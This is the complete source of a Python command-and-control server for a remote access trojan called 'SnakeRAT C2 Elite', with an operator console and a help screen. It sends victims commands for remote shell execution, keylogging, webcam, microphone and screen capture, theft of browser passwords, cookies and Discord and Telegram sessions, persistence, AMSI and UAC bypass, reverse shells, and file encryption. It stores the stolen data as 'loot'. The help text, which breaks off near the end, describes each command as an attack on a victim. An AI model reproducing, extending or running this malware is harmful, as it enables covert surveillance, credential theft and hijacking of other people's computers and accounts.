#!/usr/bin/env python3
"""
Advanced C2 Server - Pro Series
Version: 5.0 CLI Elite (Restoration)
"""

import socket
import threading
import json
import os
import base64
import hashlib
import time
import sqlite3
import sys
import argparse
import logging
import datetime
import random
import string
import ssl
import gzip
import pickle
import queue
import shlex
from pathlib import Path
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, asdict
from cryptography.fernet import Fernet
import colorama
from colorama import Fore, Style, Back

# Initialize colorama
colorama.init()

@dataclass
class ServerConfig:
    host: str = '0.0.0.0'
    port: int = 4444
    encryption_key: str = 'AdvancedSnakeRAT_2024_CrossPlatform'
    loot_dir: str = 'loot'
    database: str = 'c2.db'
    log_file: str = 'c2_server.log'
    debug: bool = False
    heartbeat_timeout: int = 120

class CryptoManager:
    def __init__(self, key: Any):
        # Always use the master key hashing for consistent static encryption
        key_bytes = key if isinstance(key, bytes) else key.encode()
        self.key = base64.urlsafe_b64encode(hashlib.sha256(key_bytes).digest())
        self.fernet = Fernet(self.key)
    
    def encrypt_json(self, data: Any) -> bytes:
        return self.fernet.encrypt(json.dumps(data).encode())
    
    def decrypt_json(self, data: bytes) -> Any:
        return json.loads(self.fernet.decrypt(data).decode())

class DatabaseManager:
    def __init__(self, db_path: str):
        self.db_path = db_path
        self._init_db()
    def _conn(self):
        conn = sqlite3.connect(self.db_path, check_same_thread=False)
        conn.row_factory = sqlite3.Row
        return conn
    def _init_db(self):
        c = self._conn()
        c.execute('CREATE TABLE IF NOT EXISTS clients (id TEXT PRIMARY KEY, ip TEXT, hostname TEXT, os TEXT, last_seen TEXT)')
        # Schema migration: Add 'user' column if missing
        try:
            c.execute('ALTER TABLE clients ADD COLUMN user TEXT')
        except: pass
        c.execute('CREATE TABLE IF NOT EXISTS loot (id INTEGER PRIMARY KEY, client_id TEXT, type TEXT, filename TEXT, path TEXT, timestamp TEXT)')
        c.commit()
    def execute(self, q, p=()):
        conn = self._conn()
        res = conn.execute(q, p)
        conn.commit()
        return res

class AdvancedC2Server:
    def __init__(self, config: ServerConfig):
        self.config = config
        self.clients: Dict[str, Any] = {}
        self.client_lock = threading.Lock()
        self.running = False
        self.selected_client = None
        
        self.logger = Logger(config.log_file, config.debug)
        self.db = DatabaseManager(config.database)
        self.crypto = CryptoManager(config.encryption_key)
        self.parser = CommandParser(self)
        self.stream_queue = queue.Queue(maxsize=30)   # larger buffer for bursts
        self._stream_active_cid = None
        self.webcam_queue = queue.Queue(maxsize=30)   # larger buffer for bursts
        self._webcam_active_cid = None
        self._cv2 = None   # cached cv2 module
        self._np  = None   # cached numpy module
        self._stream_win_init  = False  # OpenCV window created?
        self._webcam_win_init  = False

        # --- Recording state (server-side, no client involvement) ---
        self._stream_recording  = False   # is screen stream being recorded?
        self._webcam_recording  = False   # is webcam stream being recorded?
        self._stream_writer: Any  = None  # cv2.VideoWriter
        self._webcam_writer: Any  = None  # cv2.VideoWriter
        self._stream_writer_dims  = (0, 0) # Track current resolution
        self._webcam_writer_dims  = (0, 0)
        self._stream_rec_path   = ''
        self._webcam_rec_path   = ''
        
        # Import cv2/numpy once at startup and cache them
        try:
            import cv2
            import numpy as np
            self._cv2 = cv2
            self._np  = np
            self._cv2_available = True
        except Exception as e:
            self._cv2_available = False
            self.logger.warning(f"cv2/numpy not available — live stream display disabled: {e}")

    def start(self):
        self.running = True
        threading.Thread(target=self._command_loop, daemon=True).start()
        
        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            server_sock.bind((self.config.host, self.config.port))
            server_sock.listen(100)
            self.logger.success(f"C2 Elite Server listening on {self.config.host}:{self.config.port}")
            # Very short timeout so the render loop fires at ~200 Hz
            # This is the fix for stream lag: old 1.0s timeout caused up to 1s render stall
            server_sock.settimeout(0.005)
            while self.running:
                # --- Drain ALL pending screen-stream frames (not just one) ---
                rendered = False
                while True:
                    try:
                        frame_data = self.stream_queue.get_nowait()
                        self._render_stream_frame(frame_data)
                        rendered = True
                    except queue.Empty:
                        break

                # --- Drain ALL pending webcam frames ---
                while True:
                    try:
                        wc_frame = self.webcam_queue.get_nowait()
                        self._render_webcam_frame(wc_frame)
                        rendered = True
                    except queue.Empty:
                        break

                # --- One waitKey call per tick covers all OpenCV windows ---
                if rendered and self._cv2_available:
                    key = self._cv2.waitKey(1) & 0xFF
                    if key == ord('q'):
                        # Stop whichever stream is active
                        if self._stream_active_cid:
                            self._cv2.destroyWindow(f"Live Stream - {self._stream_active_cid[:12]}")
                            self.send_command([self._stream_active_cid], 'stream', {'action': 'stop'})
                            self._stream_active_cid = None
                            self._stream_win_init = False
                        if self._webcam_active_cid:
                            self._cv2.destroyWindow(f"Webcam Stream - {self._webcam_active_cid[:12]}")
                            self.send_command([self._webcam_active_cid], 'webcam_stream', {'action': 'stop'})
                            self._webcam_active_cid = None
                            self._webcam_win_init = False

                # --- Accept new connections (non-blocking) ---
                try:
                    client_sock, addr = server_sock.accept()
                    threading.Thread(target=self._handle_client, args=(client_sock, addr), daemon=True).start()
                except socket.timeout:
                    pass  # No new connection, loop back
        except Exception as e:
            self.logger.error(f"Critical server error: {e}")

    def _render_stream_frame(self, frame_data):
        """Render a screen-stream frame. Called from main thread (OpenCV requirement)."""
        if not self._cv2_available:
            return
        try:
            cv2 = self._cv2
            np  = self._np
            cid, data_b64 = frame_data
            self._stream_active_cid = cid
            data  = base64.b64decode(data_b64)
            nparr = np.frombuffer(data, np.uint8)
            img   = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
            if img is not None:
                win_name = f"Live Stream - {cid[:12]}"
                if not self._stream_win_init:
                    cv2.namedWindow(win_name, cv2.WINDOW_NORMAL)
                    self._stream_win_init = True
                cv2.imshow(win_name, img)

                # --- Recording: lazy-init or re-init VideoWriter on resolution change ---
                if self._stream_recording:
                    h, w = img.shape[:2]
                    if self._stream_writer:
                        # Detect resolution change
                        if self._stream_writer_dims != (w, h):
                            self._stream_writer.release()
                            self._stream_writer = None
                    
                    if self._stream_writer is None:
                        self._stream_writer_dims = (w, h)
                        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
                        self._stream_writer = cv2.VideoWriter(
                            self._stream_rec_path, fourcc, 15, (w, h))
                    self._stream_writer.write(img)

        except Exception as e:
            self.logger.error(f"Stream render error: {e}")

    def _render_webcam_frame(self, frame_data):
        """Render a webcam frame. Called from main thread (OpenCV requirement)."""
        if not self._cv2_available:
            return
        try:
            cv2 = self._cv2
            np  = self._np
            cid, data_b64 = frame_data
            self._webcam_active_cid = cid
            data  = base64.b64decode(data_b64)
            nparr = np.frombuffer(data, np.uint8)
            img   = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
            if img is not None:
                win_name = f"Webcam Stream - {cid[:12]}"
                if not self._webcam_win_init:
                    cv2.namedWindow(win_name, cv2.WINDOW_NORMAL)
                    self._webcam_win_init = True
                cv2.imshow(win_name, img)

                # --- Recording: lazy-init or re-init VideoWriter on resolution change ---
                if self._webcam_recording:
                    h, w = img.shape[:2]
                    if self._webcam_writer:
                        # Detect resolution change
                        if self._webcam_writer_dims != (w, h):
                            self._webcam_writer.release()
                            self._webcam_writer = None
                    
                    if self._webcam_writer is None:
                        self._webcam_writer_dims = (w, h)
                        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
                        self._webcam_writer = cv2.VideoWriter(
                            self._webcam_rec_path, fourcc, 15, (w, h))
                    self._webcam_writer.write(img)

        except Exception as e:
            self.logger.error(f"Webcam render error: {e}")

    def _start_recording(self, source: str, duration: int = 0) -> str:
        """Start recording a stream. source: 'stream' | 'webcam'. Returns status msg."""
        if not self._cv2_available:
            return 'cv2 not available — cannot record'
        rec_dir = Path(self.config.loot_dir) / 'recordings'
        rec_dir.mkdir(parents=True, exist_ok=True)
        ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
        
        if source == 'stream':
            if self._stream_recording:
                return f'Screen recording already active → {self._stream_rec_path}'
            self._stream_rec_path    = str(rec_dir / f'screen_{ts}.mp4')
            self._stream_writer      = None
            self._stream_recording   = True
            msg = f'Screen recording started → {self._stream_rec_path}'
        else:  # webcam
            if self._webcam_recording:
                return f'Webcam recording already active → {self._webcam_rec_path}'
            self._webcam_rec_path    = str(rec_dir / f'webcam_{ts}.mp4')
            self._webcam_writer      = None
            self._webcam_recording   = True
            msg = f'Webcam recording started → {self._webcam_rec_path}'

        if duration > 0:
            threading.Timer(duration, lambda: self._stop_recording(source)).start()
            msg += f' (Timed: {duration}s)'
        return msg

    def _stop_recording(self, source: str) -> str:
        """Stop recording and flush/close the VideoWriter. Returns status msg."""
        if source == 'stream':
            if not self._stream_recording:
                return 'No active screen recording'
            self._stream_recording = False
            if self._stream_writer:
                self._stream_writer.release()
                self._stream_writer = None
            path = self._stream_rec_path
            self._stream_rec_path = ''
            return f'Screen recording saved → {path}'
        else:  # webcam
            if not self._webcam_recording:
                return 'No active webcam recording'
            self._webcam_recording = False
            if self._webcam_writer:
                self._webcam_writer.release()
                self._webcam_writer = None
            path = self._webcam_rec_path
            self._webcam_rec_path = ''
            return f'Webcam recording saved → {path}'

    def _handle_client(self, sock, addr):
        cid = None
        try:
            sock.settimeout(self.config.heartbeat_timeout)
            # Direct Authentication (Original Static Key)
            raw_init = self._recv_raw(sock)
            if not raw_init: return
            client_init = self.crypto.decrypt_json(raw_init)
            if client_init.get('type') != 'init':
                self.logger.warning(f"Unauthorized access attempt from {addr[0]}")
                return
            
            cid = client_init.get('client_id')
            with self.client_lock:
                self.clients[cid] = {'sock': sock, 'addr': addr, 'info': client_init.get('info')}
            
            self.logger.success(f"Session Established: {cid} ({addr[0]})")
            self._update_db(cid, addr[0], client_init.get('info', {}))
            
            while self.running and cid in self.clients:
                try:
                    data = self._recv_json(sock)
                    if not data:
                        self.logger.warning(f"Connection closed by remote host: {cid}")
                        break
                    self._handle_msg(cid, data)
                except Exception as loop_e:
                    self.logger.error(f"Error in message loop for {cid}: {loop_e}")
                    break
        except Exception as e:
            self.logger.error(f"Session initialization failed [{addr[0]}]: {e}")
        finally:
            self._remove_client(cid)
            sock.close()

    def _send_raw(self, sock, data): sock.sendall(len(data).to_bytes(4, 'big') + data)
    def _recv_raw(self, sock):
        try:
            len_b = self._recv_all(sock, 4)
            if not len_b: return None
            return self._recv_all(sock, int.from_bytes(len_b, 'big'))
        except: return None
    def _recv_all(self, sock, n):
        d = b''
        while len(d) < n:
            p = sock.recv(n - len(d))
            if not p: return None
            d += p
        return d
    def _recv_json(self, sock):
        raw = self._recv_raw(sock)
        return self.crypto.decrypt_json(raw) if raw else None

    def _handle_msg(self, cid, msg):
        m_type = msg.get('type')
        if m_type == 'heartbeat': return
        if m_type == 'stream_frame':
            self._handle_stream_frame(cid, msg)
            return
        if m_type == 'webcam_frame':
            self._handle_webcam_frame(cid, msg)
            return
        if m_type == 'result':
            rid = msg.get('id') or 'cmd'
            data = msg.get('data')
            print(f"{Fore.CYAN}\n[RESULT][{cid}] [{rid}]")
            if isinstance(data, dict):
                if 'stdout' in data or 'stderr' in data:
                    if data.get('stdout'): print(f"{Fore.WHITE}{data['stdout']}")
                    if data.get('stderr'): print(f"{Fore.RED}ERROR: {data['stderr']}")
                    print(f"{Fore.YELLOW}[RC: {data.get('returncode', 0)}] [CWD: {data.get('cwd', '?')}]")
                else:
                    print(f"{Fore.WHITE}{json.dumps(data, indent=2)}")
            else:
                print(f"{Fore.WHITE}{data}")
            print(f"{Fore.CYAN}{'='*40}{Style.RESET_ALL}\n")
        elif m_type == 'loot':
            self._save_loot(cid, msg)
        elif m_type == 'error':
            self.logger.error(f"[{cid}] Execution Failure: {msg.get('error')}")

    def _handle_stream_frame(self, cid, msg):
        """Push stream frame into queue for main-thread rendering"""
        data_b64 = msg.get('data', '')
        if not data_b64:
            return
        self._stream_active_cid = cid
        try:
            # Drop frame if queue is full (don't block socket thread)
            self.stream_queue.put_nowait((cid, data_b64))
        except queue.Full:
            pass

    def _handle_webcam_frame(self, cid, msg):
        """Push webcam frame into queue for main-thread rendering"""
        data_b64 = msg.get('data', '')
        if not data_b64:
            return
        self._webcam_active_cid = cid
        try:
            self.webcam_queue.put_nowait((cid, data_b64))
        except queue.Full:
            pass

    def _save_loot(self, cid, msg):
        lt = msg.get('loot_type', 'misc')
        fn = msg.get('filename') or f"{cid}_{lt}_{int(time.time())}.bin"
        path = Path(self.config.loot_dir) / lt
        path.mkdir(parents=True, exist_ok=True)
        fpath = path / fn
        with open(fpath, 'wb') as f: f.write(base64.b64decode(msg.get('data')))
        self.db.execute('INSERT INTO loot (client_id, type, filename, path, timestamp) VALUES (?,?,?,?,?)',
                       (cid, lt, fn, str(fpath), datetime.datetime.now().isoformat()))
        self.logger.success(f"LOOT COLLECTED from {cid}: {fn} ({lt})")

    def _update_db(self, cid, ip, info):
        # Harmonize keys: node -> hostname, platform -> os, username -> user
        h = info.get('hostname') or info.get('node') or '?'
        o = info.get('platform') or info.get('system') or '?'
        u = info.get('username') or info.get('user') or '?'
        self.db.execute('INSERT OR REPLACE INTO clients (id, ip, hostname, os, user, last_seen) VALUES (?,?,?,?,?,?)',
                       (cid, ip, h, o, u, datetime.datetime.now().isoformat()))

    def _remove_client(self, cid):
        with self.client_lock:
            if cid in self.clients:
                del self.clients[cid]
                if self.selected_client == cid: self.selected_client = None
                self.logger.warning(f"Session Terminated: {cid}")

    def send_command(self, targets, c_type, params=None):
        cmd_id = os.urandom(4).hex()
        for cid in targets:
            client = self.clients.get(cid)
            if not client: continue
            try:
                payload = {'id': cmd_id, 'type': c_type, 'params': params or {}}
                self._send_raw(client['sock'], self.crypto.encrypt_json(payload))
            except: pass

    def _command_loop(self):
        while self.running:
            try:
                if getattr(self.parser, 'shell_mode', False):
                    prompt = f"{Fore.GREEN}SHELL@{self.selected_client or 'all'}{Style.RESET_ALL} > "
                else:
                    prompt = f"{Fore.GREEN}C2@{self.selected_client or 'all'}{Style.RESET_ALL} > "
                line = input(prompt).strip()
                if line: self.parser.parse(line)
            except (EOFError, KeyboardInterrupt): break

class CommandParser:
    def __init__(self, server: AdvancedC2Server): 
        self.server = server
        self.shell_mode = False
        
    def parse(self, text):
        try:
            if self.shell_mode:
                cmd_first = text.strip().split()[0].lower() if text.strip() else ""
                if cmd_first in ['exit', 'quit']:
                    self.shell_mode = False
                    self.server.logger.info("Exited interactive shell mode.")
                    return
                if self.server.selected_client:
                    self.server.send_command([self.server.selected_client], 'shell', {'command': text})
                else:
                    self.server.logger.error("Client disconnected. Leaving shell mode.")
                    self.shell_mode = False
                return

            try:
                parts = shlex.split(text)
            except ValueError as e:
                self.server.logger.error(f"Command formatting error: {e}")
                return
                
            cmd = parts[0].lower(); args = parts[1:]
            targets = [self.server.selected_client] if self.server.selected_client else list(self.server.clients.keys())
            
            # --- Local Control ---
            if cmd == 'clients': self._show_clients()
            elif cmd == 'select': 
                if args: self.server.selected_client = args[0]
                else: print(f"Active Client: {self.server.selected_client}")
            elif cmd == 'deselect': self.server.selected_client = None
            elif cmd == 'clear': os.system('cls' if os.name == 'nt' else 'clear')
            elif cmd == 'help': self._show_help()
            elif cmd == 'exit': os._exit(0)
            
            # --- Remote Execution ---
            elif cmd in ['shell', 'cmd']: 
                if args:
                    self.server.send_command(targets, 'shell', {'command': ' '.join(args)})
                else:
                    if not self.server.selected_client:
                        self.server.logger.error("Select a client first to enter interactive shell mode.")
                        return
                    self.shell_mode = True
                    self.server.logger.info("Entered interactive shell mode. Type 'exit' to quit.")
            elif cmd in ['powershell', 'ps']: self.server.send_command(targets, 'powershell', {'command': ' '.join(args)})
            elif cmd == 'script': self.server.send_command(targets, 'script', {'code': open(args[0]).read()})
            
            # --- Files ---
            elif cmd == 'download': self.server.send_command(targets, 'download', {'path': args[0]})
            elif cmd == 'upload': self._upload(targets, args[0])
            elif cmd == 'write': self.server.send_command(targets, 'write_file', {'path': args[0], 'content': ' '.join(args[1:])})
            elif cmd == 'browse': self.server.send_command(targets, 'file_browser', {'path': args[0] if args else '.'})
            elif cmd == 'crypt': self.server.send_command(targets, 'file_crypt', {'path': args[0], 'action': args[1]})
            
            # --- Surveillance ---
            elif cmd == 'screenshot': self.server.send_command(targets, 'screenshot', {'height': int(args[0]) if args else 0})
            elif cmd == 'webcam': self.server.send_command(targets, 'webcam', {'resolution': args[0] if args else '640x480'})
            elif cmd == 'mic': self.server.send_command(targets, 'microphone', {'duration': int(args[0]) if args else 10})
            elif cmd == 'keylog': self.server.send_command(targets, 'keylog', {'action': args[0] if args else 'dump'})
            elif cmd == 'clip': self.server.send_command(targets, 'clipboard', {'action': args[0] if args else 'get', 'text': ' '.join(args[1:]) if len(args)>1 else ''})
            
            # --- Credentials ---
            elif cmd == 'passwords': self.server.send_command(targets, 'browser_passwords')
            elif cmd == 'cookies': self.server.send_command(targets, 'browser_cookies')
            elif cmd == 'wifi': self.server.send_command(targets, 'wifi_passwords')
            elif cmd == 'chromelevator': self.server.send_command(targets, 'chromelevator')
            
            # --- Persistence / Privilege ---
            elif cmd == 'persist': self.server.send_command(targets, 'persistence')
            elif cmd == 'unpersist': self.server.send_command(targets, 'unpersist')
            elif cmd == 'elevate': self.server.send_command(targets, 'elevate')
            elif cmd == 'amsi': self.server.send_command(targets, 'amsi_bypass')
            
            # --- Network / System ---
            elif cmd == 'sysinfo': self.server.send_command(targets, 'system_info')
            elif cmd == 'process': self.server.send_command(targets, 'process', {'action': args[0] if args else 'list', 'pid': args[1] if len(args)>1 else None})
            elif cmd == 'registry': self.server.send_command(targets, 'registry', {'action': args[0], 'path': args[1]})
            elif cmd == 'scan': self.server.send_command(targets, 'port_scan', {'target': args[0], 'ports': args[1] if len(args)>1 else '1-1024'})
            elif cmd == 'socks': self.server.send_command(targets, 'socks', {'port': int(args[0]) if args else 1080})
            elif cmd == 'revshell': self.server.send_command(targets, 'reverse_shell', {'ip': args[0], 'port': int(args[1])})
            
            # --- UI Actions ---
            elif cmd == 'url': self.server.send_command(targets, 'open_url', {'url': args[0]})
            elif cmd == 'msg': self.server.send_command(targets, 'message_box', {'title': 'Admin', 'message': ' '.join(args)})
            elif cmd == 'wallpaper': self.server.send_command(targets, 'wallpaper', {'path': args[0]})
            elif cmd == 'power': self.server.send_command(targets, 'power', {'action': args[0]})
            
            # --- Hard Cleanup ---
            elif cmd == 'abort': self.server.send_command(targets, 'abort', {'task_id': args[0] if args else 'all'})
            elif cmd == 'clean': self.server.send_command(targets, 'clean_traces')
            elif cmd == 'destroy': self.server.send_command(targets, 'self_destruct')
            
            # --- New Advanced Features ---
            elif cmd == 'netstat': self.server.send_command(targets, 'netstat')
            elif cmd == 'arp': self.server.send_command(targets, 'arp')
            elif cmd == 'window': self.server.send_command(targets, 'active_window')
            elif cmd == 'drives': self.server.send_command(targets, 'list_drives')
            elif cmd == 'av': self.server.send_command(targets, 'av_discovery')
            elif cmd == 'discord': self.server.send_command(targets, 'extract_discord')
            elif cmd == 'telegram': self.server.send_command(targets, 'extract_telegram')
            elif cmd == 'outlook': self.server.send_command(targets, 'extract_outlook')
            elif cmd == 'stream': 
                action = 'start'
                fps = 15
                height = 480
                quality = 30
                
                if args:
                    if args[0].lower() in ('start', 'stop'):
                        action = args[0].lower()
                        if len(args) > 1: fps = int(args[1])
                        if len(args) > 2: height = int(args[2])
                        if len(args) > 3: quality = int(args[3])
                    else:
                        # Case: stream 30 720 50
                        fps = int(args[0])
                        if len(args) > 1: height = int(args[1])
                        if len(args) > 2: quality = int(args[2])
                
                self.server.send_command(targets, 'stream', {
                    'action': action, 'fps': fps, 'height': height, 'quality': quality
                })
            elif cmd == 'uac': self.server.send_command(targets, 'uac_bypass', {'program': args[0] if args else None})
            elif cmd == 'wmi': self.server.send_command(targets, 'wmi_persistence', {'command': args[0] if args else None})
            elif cmd == 'input': self.server.send_command(targets, 'input_control', {'action': args[0], 'x': int(args[1]) if len(args)>1 else 0, 'y': int(args[2]) if len(args)>2 else 0, 'button': args[3] if len(args)>3 else 'left', 'text': ' '.join(args[1:]) if args[0]=='type' else ''})
            elif cmd == 'block': self.server.send_command(targets, 'block_input', {'action': args[0] if args else 'block'})
            elif cmd == 'browser_kill': self.server.send_command(targets, 'close_browser')
            elif cmd == 'autorun': self.server.send_command(targets, 'set_autorun', {'commands': json.loads(args[0])})

            # --- New Feature #10: Live Webcam Stream ---
            elif cmd == 'wcam':
                action = 'start'
                fps = 10
                res = '640x480'
                quality = 50
                
                if args:
                    if args[0].lower() in ('start', 'stop'):
                        action = args[0].lower()
                        if len(args) > 1: fps = int(args[1])
                        if len(args) > 2: res = args[2]
                        if len(args) > 3: quality = int(args[3])
                    else:
                        # Case: wcam 20 1280x720 80
                        fps = int(args[0])
                        if len(args) > 1: res = args[1]
                        if len(args) > 2: quality = int(args[2])

                self.server.send_command(targets, 'webcam_stream',
                                         {'action': action, 'fps': fps, 'resolution': res, 'quality': quality})

            # --- New Feature #11: Window Activity Logger ---
            elif cmd == 'wlog':
                action   = args[0] if args else 'start'
                interval = float(args[1]) if len(args) > 1 else 1.0
                self.server.send_command(targets, 'window_logger',
                                         {'action': action, 'interval': interval})

            # --- New Feature #19: Enable RDP ---
            elif cmd == 'rdp':
                add_user = False
                username = 'svcadmin'
                password = 'P@ssw0rd!'
                if len(args) >= 1 and args[0].lower() == 'adduser':
                    add_user = True
                    if len(args) >= 2: username = args[1]
                    if len(args) >= 3: password = args[2]
                self.server.send_command(targets, 'enable_rdp',
                                         {'add_user': add_user,
                                          'username': username,
                                          'password': password})

            # --- Recording: server-local (no client command) ---
            elif cmd in ('recstream', 'recwcam'):
                self._handle_rec_cmd(cmd, args)

            else: print(f"Error: Unknown command '{cmd}'")

            # --- Recording commands (server-local, no client command sent) ---
        except Exception as e: print(f"Command Error: {e}")

    def _handle_rec_cmd(self, cmd, args):
        """Handle recstream / recwcam commands."""
        # cmd = 'recstream' | 'recwcam'
        source = 'stream' if cmd == 'recstream' else 'webcam'
        action = args[0].lower() if args else 'start'
        if action == 'start':
            duration = int(args[1]) if len(args) > 1 else 0
            msg = self.server._start_recording(source, duration)
        elif action == 'stop':
            msg = self.server._stop_recording(source)
        elif action == 'status':
            if source == 'stream':
                active = self.server._stream_recording
                path   = self.server._stream_rec_path
            else:
                active = self.server._webcam_recording
                path   = self.server._webcam_rec_path
            msg = f"Recording: {'ACTIVE' if active else 'stopped'}"
            if active: msg += f" → {path}"
        else:
            msg = f"Unknown action '{action}' — use start | stop | status"
        print(f"{Fore.CYAN}[REC] {msg}{Style.RESET_ALL}")

    def _upload(self, targets, l_path):
        try:
            with open(l_path, 'rb') as f: data = base64.b64encode(f.read()).decode()
            self.server.send_command(targets, 'upload', {'filename':os.path.basename(l_path), 'data': data})
        except Exception as e: print(f"Upload failed: {e}")

    def _show_clients(self):
        print(f"\n{Fore.YELLOW}{'ID':<18} {'IP':<15} {'System':<20} {'User':<15}{Style.RESET_ALL}")
        print("-" * 75)
        with self.server.client_lock:
            for cid, info in self.server.clients.items():
                s = info.get('info') or {}
                # Harmonized display
                h = s.get('hostname') or s.get('node') or '?'
                o = s.get('platform') or s.get('os') or '?'
                u = s.get('username') or s.get('user') or '?'
                print(f"{cid:<18} {info['addr'][0]:<15} {o[:20]:<20} {u:<15}")
        print()
    def _show_help(self):
        W  = Style.RESET_ALL
        C  = Fore.CYAN
        G  = Fore.GREEN
        Y  = Fore.YELLOW
        M  = Fore.MAGENTA
        R  = Fore.RED
        Bl = Fore.BLUE
        print(f"""
{C}{'='*70}{W}
  SnakeRAT C2 Elite  |  Full Command Reference  |  type 'help' to reprint
{C}{'='*70}{W}

{Y}╔══════════════════════════════════════╗
║        SESSION MANAGEMENT           ║
╚══════════════════════════════════════╝{W}
  {G}clients{W}              List all connected clients (ID, IP, OS, User)
  {G}select <id>{W}          Focus all subsequent commands on this client ID
  {G}deselect{W}             Go back to broadcast mode (all clients)
  {G}clear{W}                Clear the terminal screen
  {G}exit{W}                 Shut down the C2 server entirely

{Y}╔══════════════════════════════════════╗
║        EXECUTION                     ║
╚══════════════════════════════════════╝{W}
  {G}shell <cmd>{W}          Run a shell command on the victim (cmd.exe / bash)
                       Maintains a persistent CWD — 'cd' works across calls
                       Ex: shell whoami  |  shell dir C:\\Users
  {G}shell{W}  (no args)     Enter interactive shell mode — type commands freely,
                       type 'exit' to leave shell mode
  {G}ps <cmd>{W}             Run a PowerShell command silently (Windows only)
                       Ex: ps Get-Process | Select Name,CPU
  {G}script <file>{W}        Upload and execute a local Python script on the victim
                       Ex: script ./payload.py
  {G}amsi{W}                 Patch AMSI in memory — blinds Windows Defender/EDR
                       Patches AmsiScanBuffer to return SCAN_RESULT_CLEAN.
                       Run before any AV-detected operations.  [Admin required]

{Y}╔══════════════════════════════════════╗
║        FILE OPERATIONS               ║
╚══════════════════════════════════════╝{W}
  {G}browse <path>{W}        List files/folders at a remote path with sizes & dates
                       Ex: browse C:\\Users\\target\\Desktop
  {G}download <path>{W}      Pull any file from the victim to loot/file/ on the server
                       Ex: download C:\\Users\\target\\secret.docx
  {G}upload <local_file>{W}  Push a local file to the victim's current working directory
                       Ex: upload ./malware.exe
  {G}write <path> <text>{W}  Create/overwrite a file with given text content
                       Ex: write C:\\Temp\\note.txt "hello world"
  {G}crypt <path> <action>{W} Encrypt or decrypt a file/folder using AES-256 (Fernet)
                       action = encrypt | decrypt
                       Ex: crypt C:\\Users\\target\\Documents encrypt

{Y}╔══════════════════════════════════════╗
║        SURVEILLANCE                  ║
╚══════════════════════════════════════╝{W}
  {G}screenshot [h]{W}     Take a screenshot of the victim's current screen.
                       Optionally specify target height (e.g. 720, 1080).
                       Saved to loot/screenshot/.
  {G}webcam [res]{W}       Capture a single still photo from the victim's webcam.
                       Optionally specify widthxheight (e.g. 1280x720).
                       Auto-warms the camera. Saved to loot/webcam/.
  {G}mic <seconds>{W}        Record audio from the victim's microphone for N seconds.
                       Output: WAV file saved to loot/microphone/
                       Ex: mic 30   (record 30 seconds)
  {G}keylog start{W}         Start the background keylogger
  {G}keylog stop{W}          Stop the background keylogger
  {G}keylog dump{W}          Dump the background keylogger buffer and clear it.
                       Runs in background — captures ALL keystrokes.
                       Output saved to loot/keylog/
  {G}keylog status{W}        Check if the keylogger is running + current buffer size
  {G}keylog clear{W}         Wipe the keylog buffer without exfiltrating it
  {G}clip get{W}             Steal the current clipboard contents (text, passwords, etc.)
  {G}clip set <text>{W}      Overwrite the victim's clipboard with custom text
                       Ex: clip set "http://phishing.site"

{Y}╔══════════════════════════════════════╗
║        CREDENTIAL HARVESTING         ║
╚══════════════════════════════════════╝{W}
  {G}passwords{W}            Dump saved passwords from Chrome, Edge, Brave, Opera, Opera GX.
                       Decrypts AES-GCM (v10/v11/v20) and DPAPI-encrypted passwords.
                       Output: JSON loot file with browser, profile, URL, user, pass.
  {G}cookies [url]{W}        Dump browser cookies. Optionally filter to a specific domain.
                       Ex: cookies instagram.com
  {G}cookies live <url>{W}   Extract cookies via Chrome DevTools Protocol (CDP) — bypasses
                       App-Bound Encryption (v20+). Opens headless browser with victim's
                       profile shadow-copied. Best for Instagram/Facebook session cookies.
                       Ex: cookies live https://www.instagram.com
  {G}wifi{W}                 Extract all saved Wi-Fi SSIDs and plaintext passwords.
                       Windows: netsh wlan. Linux: NetworkManager files / nmcli.
  {G}discord{W}              Steal Discord auth tokens from Local Storage (leveldb).
                       Also checks Chrome, Brave, Opera, Yandex browser profiles.
  {G}telegram{W}             Package the Telegram Desktop tdata session folder as a ZIP.
                       Can be imported directly to hijack the victim's Telegram account.
  {G}outlook{W}              Locate Outlook profile registry entries and .pst/.ost data files.
                       Returns their paths and sizes for targeted manual extraction.
  {G}chromelevator{W}        Run the Chromelevator binary to extract browser data at a
                       lower level, bypassing standard encryption.

{Y}╔══════════════════════════════════════╗
║        NETWORK & PIVOTING            ║
╚══════════════════════════════════════╝{W}
  {G}scan <ip> <ports>{W}    TCP port scan the target. Ports can be a range (1-1024)
                       or single port. Attempts banner grabbing on open ports.
                       Ex: scan 192.168.1.1 20-443
  {G}socks <port>{W}         Start a SOCKS5 proxy server on the victim. Route your tools
                       through it to pivot into the internal network.
                       Ex: socks 1080   then: proxychains nmap ...
  {G}revshell <ip> <port>{W} Spawn a reverse shell back to the attacker.
                       Windows: PowerShell TCP shell. Linux/Mac: Python pty shell.
                       Ex: revshell 10.0.0.1 4445
  {G}netstat{W}              List all active TCP/UDP connections on the victim (psutil).
                       Shows local/remote address, status, and owning PID.
  {G}arp{W}                  Dump the victim's ARP table (arp -a / arp -n).
                       Reveals other hosts on the local network segment.

{Y}╔══════════════════════════════════════╗
║        SYSTEM CONTROL                ║
╚══════════════════════════════════════╝{W}
  {G}sysinfo{W}              Full system profile: OS, CPU, RAM, disks, NICs, public IP,
                       MAC address, users, admin status, Python packages, fingerprint.
  {G}process list{W}         List top-100 running processes (PID, name, CPU%, RAM%)
  {G}process kill <pid>{W}   Terminate a process by PID
                       Ex: process kill 1337
  {G}service list{W}         List all system services (Windows: SC / Linux: systemctl)
  {G}service start <name>{W} Start a named service
  {G}service stop <name>{W}  Stop a named service
  {G}registry read <path>{W} Read a Windows registry value
                       Ex: registry read HKCU\\Software\\MyApp Value
  {G}registry write <path>{W} Write a string value to the registry
  {G}registry delete <path>{W} Delete a registry value
  {G}power lock{W}           Lock the victim's workstation immediately
  {G}power shutdown{W}       Shut down the victim's machine (immediate)
  {G}power reboot{W}         Reboot the victim's machine
  {G}window{W}               Get the title of the currently focused window.
                       Quick way to see what the victim is doing right now.
  {G}drives{W}               List all logical drives with labels and types (fixed/USB/CD)
  {G}av{W}                   Query Windows SecurityCenter2 WMI for installed AV products.
                       Shows product name and state (enabled/disabled/expired).

